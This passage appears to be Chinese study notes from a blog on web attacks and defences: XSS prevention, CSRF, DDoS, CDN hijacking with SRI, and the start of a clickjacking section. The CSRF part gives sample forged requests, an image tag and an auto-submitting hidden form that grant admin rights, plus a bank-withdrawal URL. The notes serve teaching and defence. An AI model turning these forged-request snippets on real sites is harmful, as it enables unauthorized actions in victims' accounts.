URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><p>具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据</p></blockquote><h4 id="1.4-阻止预防">1.4 阻止预防<a title="#1.4-阻止预防" href="#1.4-阻止预防"></a></h4><h5 id="1.4.1-总结上述攻击特点">1.4.1 总结上述攻击特点<a title="#1.4.1-总结上述攻击特点" href="#1.4.1-总结上述攻击特点"></a></h5><p><a href="https://juejin.cn/post/6844903685122703367#heading-8">https://juejin.cn/post/6844903685122703367#heading-8</a></p><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><ol><li>攻击者提交恶意代码。</li><li>浏览器执行恶意代码。</li></ol><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><p><strong>输入过滤:</strong></p><ul><li><strong>前端过滤输入，然后提交到后端</strong>？<strong>不可行</strong>，一旦攻击者绕过前端过滤，直接构造请求，就可以提交尔恶意代码了</li><li><strong>后端写入数据库前，对输入进行过滤，然后将安全内容返回给前端？不可行</strong>在提交阶段，不确定内容要输出到哪里：可能同时提供给 前端和客户端，if 转码 客户端显示的内容是转码后的内容；在前端中不同的位置所需的编码也不一样。</li></ul><blockquote><p>输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>对于<strong>明确的输入类型</strong>，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的</p></blockquote><p>那就只能：</p><p><strong>防止浏览器执行恶意代码</strong></p><ul><li>防止 html 中出现注入</li><li>防止 JavaScript 执行时，执行恶意代码</li></ul><h5 id="1.4.2-预防存储型和反射型xss攻击">1.4.2 预防存储型和反射型xss攻击<a title="#1.4.2-预防存储型和反射型xss攻击" href="#1.4.2-预防存储型和反射型xss攻击"></a></h5><p>存储型和反射型 XSS 都是在<strong>服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</strong></p><p>预防这两种漏洞，有两种常见做法：</p><ul><li><p>改成纯前端渲染，把代码和数据分隔开。</p></li><li><p>对 HTML 做充分转义。</p><blockquote><p><strong>转义应该在输出 HTML 时进行，而不是在提交用户输入时</strong></p></blockquote></li></ul><h6 id="1.4.2.1-纯前端渲染">1.4.2.1 纯前端渲染<a title="#1.4.2.1-纯前端渲染" href="#1.4.2.1-纯前端渲染"></a></h6><p>纯前端渲染的过程：</p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p><strong>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞</strong>（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多<strong>内部、管理</strong>系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h6 id="1.4.2.2-转义-html">1.4.2.2 转义 html<a title="#1.4.2.2-转义-html" href="#1.4.2.2-转义-html"></a></h6><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><div class="φbq"><div class="φbs"><table><thead><tr><th>XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td>HTML 标签文字内容</td><td>有</td></tr><tr><td>HTML 属性值</td><td>有</td></tr><tr><td>CSS 内联样式</td><td>无</td></tr><tr><td>内联 JavaScript</td><td>无</td></tr><tr><td>内联 JSON</td><td>无</td></tr><tr><td>跳转链接</td><td>无</td></tr></tbody></table></div></div><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><h6 id="1.4.2.3-总结">1.4.2.3 总结<a title="#1.4.2.3-总结" href="#1.4.2.3-总结"></a></h6><p>存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。</p><p>而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此<strong>基于 DOM 的 XSS 攻击是属于前端的安全漏洞</strong>。</p><p><strong>共同点</strong>：先往浏览器中注入恶意脚本，再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</p><p>所以<strong>可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</strong></p><h5 id="1.4.3-预防-dom-型">1.4.3 预防 dom 型<a title="#1.4.3-预防-dom-型" href="#1.4.3-预防-dom-型"></a></h5><p>DOM 型 XSS 攻击，实际上就是<strong>网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了</strong>。</p><ul><li><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应<strong>尽量使用 <code>.textContent</code>、<code>.setAttribute()</code></strong> 等。</p></li><li><p>如果用 <strong>Vue/React 技术栈</strong>，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p></li><li><p><strong>DOM 中的内联事件监听器</strong>，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p></li></ul><h5 id="1.4.4-其他通用预防方案">1.4.4 其他通用预防方案<a title="#1.4.4-其他通用预防方案" href="#1.4.4-其他通用预防方案"></a></h5><ol><li><p><strong>利用 <a href="https://juejin.cn/post/6844903665224908807" target="_blank">CSP</a></strong></p><p>CSP 的功能</p><ul><li>限制加载其他域下的资源文件</li><li>禁止向第三方域提交数据，用户数据不会外泄</li><li>禁止执行内联脚本和未授权脚本</li><li>提供上报机制，帮助发现 XSS 攻击</li></ul></li><li><p><strong>使用 httpOnly</strong></p><p>因为很多 XSS 攻击都是用来盗 cookie 的，可以通过使用 httpOnly 属性来爆出cookie</p><p>通常服务器可以将 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的</p><p><strong>使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。</strong></p><blockquote><p>打开谷歌的响应头</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set-<span class="attr">cookie</span>: <span class="variable constant_">NID</span>=<span class="number">189</span>=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-<span class="title class_">BzEYsNVa7TZmjAYTxYTOM9L</span>_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; </span><br><span class="line">expires=<span class="title class_">Sat</span>, <span class="number">18</span>-<span class="title class_">Apr</span>-<span class="number">2020</span> <span class="number">06</span>:<span class="number">52</span>:<span class="number">22</span> <span class="variable constant_">GMT</span>; </span><br><span class="line">path=/; </span><br><span class="line">domain=.<span class="property">google</span>.<span class="property">com</span>; </span><br><span class="line"><span class="title class_">HttpOnly</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>使用组件</strong></p></li></ol><ul><li><p>前端防御组件 js-xss</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install xss</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br><span class="line">$(<span class="string">&#x27;btnSure&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">xss</span>($(<span class="string">&#x27;.input&#x27;</span>).<span class="title function_">val</span>())</span><br><span class="line">    putout.<span class="title function_">html</span>(result)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><ol start="5"><li><p><strong>限制输入内容长度</strong></p><p>不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p></li></ol><h5 id="1.4.5-减少攻击的产生">1.4.5 减少攻击的产生<a title="#1.4.5-减少攻击的产生" href="#1.4.5-减少攻击的产生"></a></h5><ul><li>利用模板引擎：自带html转移功能</li><li>避免内联事件</li><li>避免拼接 html</li><li>增加攻击难度，降低攻击后果</li><li>主动检测和发现：用 xss 攻击字符串和自动扫描工具寻找潜在的 xss 漏洞</li></ul><h3 id="2.-csrf攻击-—-跨站请求伪造">2. CSRF攻击 — 跨站请求伪造<a title="#2.-csrf攻击-—-跨站请求伪造" href="#2.-csrf攻击-—-跨站请求伪造"></a></h3><p>CSRF（Cross-site request forgery）<strong>跨站请求伪造</strong>，是一种利用网站可信用户的权限去执行未授权的命令的一种恶意攻击。也称作 one-click attack 或者 session riding，其简写有时候也会使用 <strong>XSRF</strong>。</p><ul><li>CSRF ： 攻击者利用受害者的身份，以受害者的名义发送恶意请求。利用用户当前身份做一些未经过授权的事。</li><li>XSS   ： 目的是获取用户的身份信息。攻击者窃取用户身份( session / cookie )。</li></ul><h4 id="2.1-csrf-的危害">2.1 CSRF 的危害<a title="#2.1-csrf-的危害" href="#2.1-csrf-的危害"></a></h4><p>CSRF可以盗用受害者的身份，完成受害者在web浏览器有权限进行的任何操作…</p><ul><li>以你的名义发送诈骗邮件，消息</li><li>用你的账号购买商品</li><li>用你的名义完成虚拟货币转账</li><li>泄露个人隐私</li></ul><h4 id="2.2-产生-csrf-条件">2.2 产生 CSRF 条件<a title="#2.2-产生-csrf-条件" href="#2.2-产生-csrf-条件"></a></h4><ul><li>目标站点一定要有 CSRF 漏洞；</li><li>用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；</li><li>受害者有意或者无意的访问了攻击者发布的页面或者链接地址</li></ul><blockquote><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3Dbob2" target="_blank">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。<br>黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3DMallory" target="_blank">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。<br>这时，Mallory <strong>想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码</strong>： src=”<a href="https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3DMallory" target="_blank">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，**并且通过广告等诱使 Bob 来访问他的网站。**当 Bob 访问该网站时，<strong>上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器</strong>。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，**如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，**钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p></blockquote><blockquote><p>与 XSS 不同，CSRF 不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以对于 CSRF 我们主要的防护手段是提升服务器的安全性</p></blockquote><h4 id="2.3-产生的方式">2.3 产生的方式<a title="#2.3-产生的方式" href="#2.3-产生的方式"></a></h4><ol><li><p><strong>GET 请求</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/user/grant_super_user/121&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>攻击者 121 想将自己的身份添加为网站管理员，然后他发了一个网站会加载的图片到帖子上，其地址为上述 图片地址 ，请求到了后台数据</p></blockquote></li><li><p><strong>POST 请求</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;#CSRF_forCSRFm&#x27;</span>).<span class="title function_">trigger</span>(<span class="string">&#x27;submit&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/user/grant_super_user&quot;</span> <span class="attr">id</span>=<span class="string">&quot;CSRF_form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;uid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;121&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>伪造一个用户打开黑客站点时能自动提交的表单发送 POST 请求</p></blockquote></li><li><p><strong>诱导用户点击链接</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">&quot;放黑客要操作的链接&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上</p><p>一旦用户点击了这个链接，那么就会被黑客利用他的账户做一些没有被本人授权的事情</p></blockquote></li></ol><p><strong>利用服务器的漏洞和用户的登录状态来实施攻击</strong></p><h4 id="2.4-如何防止-csrf-攻击">2.4 如何防止 CSRF 攻击<a title="#2.4-如何防止-csrf-攻击" href="#2.4-如何防止-csrf-攻击"></a></h4><h5 id="2.4.1-利用-cookie-的-samesite-属性">2.4.1 利用 Cookie 的 SameSite 属性<a title="#2.4.1-利用-cookie-的-samesite-属性" href="#2.4.1-利用-cookie-的-samesite-属性"></a></h5><p>黑客会<strong>利用用户的登录状态</strong>来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据。</p><p>通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，最好能实现<strong>从第三方站点发送请求时禁止 Cookie 的发送</strong>，因此在浏览器通过不同来源发送 http 请求时，有如下区别：</p><ul><li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器</li><li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送</li></ul><p>SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效降低 CSRF 攻击的风险。</p><p>做法：在 HTTP 响应头，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。</p><p>SameSite 的值：</p><ul><li><strong>Strict</strong>：浏览器会完全禁止第三方Cookie；</li><li><strong>Lax</strong>：跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果使用 Post 方法，或通过 img、iframe 等标签加载的 URL，都不会携带 Cookie。</li><li><strong>None</strong>：在任何请求的会发送 Cookie 数据</li></ul><h5 id="2.4.2-同源检测">2.4.2 同源检测<a title="#2.4.2-同源检测" href="#2.4.2-同源检测"></a></h5><p>服务器验证请求的来源站点。在 HTTP 协议中，每一个异步请求都会携带上两个 Header，用户标记来源域名：</p><ul><li><p><strong>Origin</strong>：通过 XMLHttpRequest、Fecth 发起跨站请求或通过 Post 方法发送请求时，都会带上 Origin 属性</p><blockquote><p>只包含域名信息</p><p>且再两种情况下不会存在： IE11同源策略、302重定向</p></blockquote></li><li><p><strong>Referer</strong>：记录了该 HTTP 请求的来源地址</p><blockquote><p>if 从 极客时间的官网打开 InfoQ 的站点，那么 Referer 为 极客时间<strong>详细的 url</strong></p></blockquote></li></ul><p>所以服务器的策略是优先判断 Origin，if 无 Origin，再根据实际情况判断是否使用 referer.</p><h5 id="2.4.3-csrf-token">2.4.3 CSRF Token<a title="#2.4.3-csrf-token" href="#2.4.3-csrf-token"></a></h5><p>CSRF 中 攻击者无法直接窃取到用户的信息— cookie、header、网站内容等，仅仅是毛用 cookie 的信息。</p><p>而 CSRF 成功的原因是，<strong>服务器误把攻击者发送的请求当成用户自己的请求</strong>。所以可以要求所有的<strong>用户请求都携带一个 CSRF 无法获取到的 Token</strong>。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开。</p><ul><li>浏览器向服务器发送请求时，服务器生成一个 CSRF Token，然后将该字符串植入到返回的页面中</li><li>浏览器若要发起什么请求时，需要带上页面的 CSRF token，服务器会验证其是否合法。若时第三方站点发出的请求，就无法获取到 CSRF token，所以即使发出了请求，服务器也会拒绝。</li></ul><h3 id="3.-ddos-攻击-—-分布式拒绝服务攻击">3. DDos 攻击 — 分布式拒绝服务攻击<a title="#3.-ddos-攻击-—-分布式拒绝服务攻击" href="#3.-ddos-攻击-—-分布式拒绝服务攻击"></a></h3><h4 id="3.1-简介">3.1 简介<a title="#3.1-简介" href="#3.1-简介"></a></h4><p>其前身：<strong>DoS( Denial of Service )攻击，拒绝服务攻击</strong>，这种攻击行为使网站服务器充斥大量的要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷而停止提供正常的网络服务。</p><p><strong>DDOS ( Distributed Denial of Service ) 分布式拒绝服务攻击</strong>，主要利用网络上现有的机器及系统的漏洞，攻占大量联网主机，使其成为攻击者的代理。当被控制的机器达到一定数量后，攻击者通过发送指令操纵这些攻击机同时向目标主机或网络发起 DoS 攻击，大量消耗其网络带宽和系统资源，导致该网络或系统瘫痪或停止提供正常的网络服务。</p><h4 id="3.2-原理">3.2 原理<a title="#3.2-原理" href="#3.2-原理"></a></h4><p>一个比较完善的 DDoS 攻击体系分为：<strong>攻击者（ attacker / master ）、控制傀儡机（ demon / agent ）、受害者（ victim ）。</strong></p><blockquote><p>第2和第3部分，分别用做控制和实际发起攻击。第2部分的控制机只发布令而不参与实际的攻击，第3部分攻击傀儡机上发出DDoS的实际攻击包。</p><p>对第2和第3部分计算机，攻击者有控制权或者是部分的控制权，并把相应的DDoS程序上传到这些平台上，这些程序与正常的程序一样运行并等待来自攻击者的指令，通常它还会利用各种手段隐藏自己不被别人发现。</p><p>在平时，这些傀儡机器并没有什么异常，只是一旦攻击者连接到它们进行控制，并发出指令的时候，攻击愧儡机就成为攻击者去发起攻击了。</p></blockquote><p>之所以采用这样的结构，一个重要的目的是隔离网络联系，保护攻击者，使其不会在攻击进行时受到监控系统的跟踪。同时也能够更好地协调进攻，因为攻击执行器的数目太多，同时由一个系统发布命令会造成控制系统的网络阻塞，影响攻击的突然性和协同性。</p><p>其过程为：</p><ol><li><p>扫描大量主机以寻找可入侵主机目标</p></li><li><p>有安全漏洞的主机并获取控制器</p></li><li><p>入侵主机中安装攻击程序</p></li><li><p>用已入侵主机继续进行扫描和入侵</p></li><li><p>当受控制的攻击代理机达到攻击者满意的数量时。攻击者就可以通过攻击主控机随时发出击指令，一旦命令传送到攻击操纵机，主控机就可以关闭或脱离网络，以逃避追踪。</p></li><li><p>攻击操纵机将命令发布到攻击代理机，其接收到后，就开始向目标主机发出大量的服务请求数据包。</p><blockquote><p>这些数据包经过伪装，使被攻击者无法识别它的来源面且，这些包所请求的服务往往要消耗较大的系统资源，如CP或网络带宽。如果数百台甚至上千台攻击代理机同时攻击一个目标，就会导致<strong>目标主机网络和系统资源的耗尽，从而停止服务。有时，甚至会导致系统崩溃。</strong></p></blockquote></li></ol><p>这样还可以阻塞目标网络的防火墙和路由器等网络设备，进一步加重网络拥塞状况。于是，目标主机根本无法为用户提供任何服务。攻击者所用的协议都是一些非常常见的协议和服务。这样，系统管理员就难于区分恶意请求和正连接请求，从而无法有效分离出攻击数据包</p><h4 id="3.3-表现形式">3.3 表现形式<a title="#3.3-表现形式" href="#3.3-表现形式"></a></h4><p>主要目的是让指定目标无注提供正常服务，甚至从互联网上消失</p><p>表现形式：</p><ol><li><p><strong>流量攻击</strong>：主要是针对网络带宽的攻击，即大量攻击包导致网络带宽被阻塞，合法网络包被虚假的攻击包淹没而无法到达主机</p></li><li><p><strong>资源耗尽攻击</strong>：主要是针对服务器主机的政击，即通过大量攻击包导致主机的内存被耗尽或CPU内核及应用程序占完而造成无法提供网络服务</p></li></ol><h4 id="3.4-识别">3.4 识别<a title="#3.4-识别" href="#3.4-识别"></a></h4><ol><li>Ping测试</li><li>Telnet测试</li></ol><h4 id="3.5-攻击方式">3.5 攻击方式<a title="#3.5-攻击方式" href="#3.5-攻击方式"></a></h4><ol><li>SYN/ACK Flood攻击</li><li>TCP全连接攻击</li><li>TCP刷 Script脚本攻击</li></ol><h4 id="3.6-防护策略">3.6 防护策略<a title="#3.6-防护策略" href="#3.6-防护策略"></a></h4><ol><li>采用高性能的网络设备</li><li>尽量避免NAT的使用</li><li>充足的网络带宽保证</li><li>升级主机服务器硬件</li><li>把网站做成静态页面</li></ol><h3 id="4.-点击劫持">4. 点击劫持<a title="#4.-点击劫持" href="#4.-点击劫持"></a></h3><h3 id="5.-cdn-劫持">5. CDN 劫持<a title="#5.-cdn-劫持" href="#5.-cdn-劫持"></a></h3><h4 id="5.1-简介">5.1 简介<a title="#5.1-简介" href="#5.1-简介"></a></h4><p>[CDN（Content Delivery Network）内容分发网络](./08 <a href="http://cdn.md">cdn.md</a>)</p><p>CDN 劫持：CDN 资源存在于第三方服务器，在安全性上并不完全可控。CDN 劫持是一种非常难以定位的问题，首先劫持者会利用某种算法或者随机的方式进行劫持，所以非常难以复现，很多用户出现后刷新页面就不再出现了。</p><p><strong>开启 SRI 能有效保证页面引用资源的完整性，避免恶意代码执行。</strong></p><h4 id="5.2-sri-简介">5.2 SRI 简介<a title="#5.2-sri-简介" href="#5.2-sri-简介"></a></h4><p>SRI（Subresource Integrity）子资源完整性，指浏览器通过验证资源的完整性（通常从 CDN 获取）来判断其是否被篡改的安全特性。</p><p>通过给 link / script 标签添加 integrity 属性可开启 SRI 功能，</p><p>eg：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//s.url.cn/xxxx/aaa.js&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">&quot;sha256-xxx sha384-yyy&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>integrity 值分成两个部分，第一部分指定哈希值的生成算法（sha256、sha384 及 sha512），第二部分是经过 base64 编码的实际哈希值，两者之间通过一个短横（-）分割。integrity 值可以包含多个由空格分隔的哈希值，只要文件匹配其中任意一个哈希值，就可以通过校验并加载该资源。上述例子中使用了 sha256 和 sha384 两种 hash 方案。</p><p><code>crossorigin=&quot;anonymous&quot;</code> 的作用是引入跨域脚本，在 HTML5 中有一种方式可以获取到跨域脚本的错误信息，首先跨域脚本的服务器必须通过 Access-Controll-Allow-Origin 头信息允许当前域名可以获取错误信息，然后是当前域名的 script 标签也必须声明支持跨域，也就是 crossorigin 属性。link、img 等标签均支持跨域脚本。如果上述两个条件无法满足的话， 可以使用 <code>try catch</code> 方案。</p></blockquote><h4 id="5.3-浏览器处理-sri">5.3 浏览器处理 SRI<a title="#5.3-浏览器处理-sri" href="#5.3-浏览器处理-sri"></a></h4><ul><li><p>当浏览器在 script 或者 link 标签中遇到 integrity 属性之后，会在执行脚本或者应用样式表之前<strong>对比所加载文件的哈希值和期望的哈希值</strong>。</p></li><li><p>当脚本或者样式表的哈希值和期望的不一致时，浏览器必须<strong>拒绝执行</strong>脚本或者应用样式表，并且必须返回一个网络错误说明获得脚本或样式表失败。</p></li></ul><p><strong>Q：那么当 script 或者 link 资源 SRI 校验失败的时候应该怎么做？</strong></p><p>A：通过 script 的 onerror 事件，当遇到 onerror 的时候重新 load 静态文件服务器之间的资源</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;//11.url.cn/aaa.js&quot;</span></span><br><span class="line">        integrity=<span class="string">&quot;sha256-xxx sha384-yyy&quot;</span></span><br><span class="line">        crossorigin=<span class="string">&quot;anonymous&quot;</span></span><br><span class="line">        onerror=<span class="string">&quot;loadScriptError.call(this, event)&quot;</span></span><br><span class="line">        onsuccess=<span class="string">&quot;loadScriptSuccess&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>Q：如何判断发送 CDN 劫持</strong></p><p>A：再请求一次数据，比较两次得到文件的内容（当然不必全部比较），如果内容不一致，就可以得出结论了。</p><blockquote><p>可以只比较前1000字符，CDN 劫持者会在 js 文件最前面注入一些代码来达到他们的目的，注入中间代码需要 AST 解析，成本较高，所以比较全部字符串没有意义。</p></blockquote><h3 id="6.-clickjacking-—-点击劫持">6. ClickJacking — 点击劫持<a title="#6.-clickjacking-—-点击劫持" href="#6.-clickjacking-—-点击劫持"></a></h3><h4 id="6.1-简介">6.1 简介<a title="#6.1-简介" href="#6.1-简介"></a></h4><p>点击劫持 ( ClickJacking ) / UI-覆盖攻击（UI redress attack），是一种视觉上的欺骗手段。</p><blockquote><p>通过覆盖不可见的框架误导受害者点击,虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。这种攻击利用了HTML中<iframe>标签的透明属性。</p></blockquote><p>一般有两种方式：</p><ol><li>攻击者使用一个透明的 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户在不知情的情况下点击透明的iframe页面；</li><li>攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义</li></ol><h4 id="6.2-原理">6.2 原理<a title="#6.2-原理" href="#6.2-原理"></a></h4><p>攻击者在点击劫持漏洞利用实现过程中使用 iframe 作为目标网页载体。iframe 是 HTML 